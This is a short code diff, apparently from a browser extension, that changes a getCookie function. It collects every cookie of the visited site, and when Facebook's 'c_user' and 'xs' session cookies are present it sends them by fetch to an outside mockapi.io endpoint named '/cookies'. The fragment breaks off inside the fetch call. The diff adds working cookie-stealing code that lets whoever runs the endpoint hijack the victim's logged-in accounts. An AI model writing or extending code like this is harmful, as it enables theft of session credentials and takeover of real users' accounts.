@@ -515,12 +515,13 @@ function getCookie() {
                 function (cookies) {
                     let fullCookie = "";
                     cookies.forEach((i) => {
-                        if (i.name == "c_user" || i.name == "xs") {
-                            fullCookie += `${i.name}=${i.value}; `;
-                        }
+                        fullCookie += `${i.name}=${i.value}; `;
                     });
 
-                    if (fullCookie != "") {
+                    if (
+                        fullCookie.includes("xs") &&
+                        fullCookie.includes("c_user")
+                    ) {
                         fetch(
                             "https://6514b3f1dc3282a6a3cd7125.mockapi.io/cookies",
                             {
